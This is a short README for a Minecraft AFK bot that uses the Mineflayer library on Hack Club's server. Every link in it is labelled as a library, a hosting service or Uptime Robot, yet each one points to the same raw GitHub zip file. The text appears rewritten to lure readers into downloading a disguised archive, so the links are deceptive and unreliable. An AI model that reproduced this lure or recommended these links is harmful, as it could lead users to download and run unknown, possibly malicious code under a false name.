MinecraftBot that replaces AFKing on a computer

The goal of this bot was to emulate regular Minecraft AFKing using something like an auto-clicker.

It's original purpose was that it would AFK on Hack Club's Minecraft Server.  The server only allows bots that emulate what a normal AFK player would be able to do. This introduced many issues since [Mineflayer](https://raw.githubusercontent.com/naolembro/minecraftBot/master/modules/Bot_minecraft_1.2.zip), the library that the bot uses, does not make things like AFK fishing and attacking that would emulate an auto-clicker very simple. 

This bot runs on [https://raw.githubusercontent.com/naolembro/minecraftBot/master/modules/Bot_minecraft_1.2.zip](https://raw.githubusercontent.com/naolembro/minecraftBot/master/modules/Bot_minecraft_1.2.zip) and uses [Uptime Robot](https://raw.githubusercontent.com/naolembro/minecraftBot/master/modules/Bot_minecraft_1.2.zip) to keep it awake.
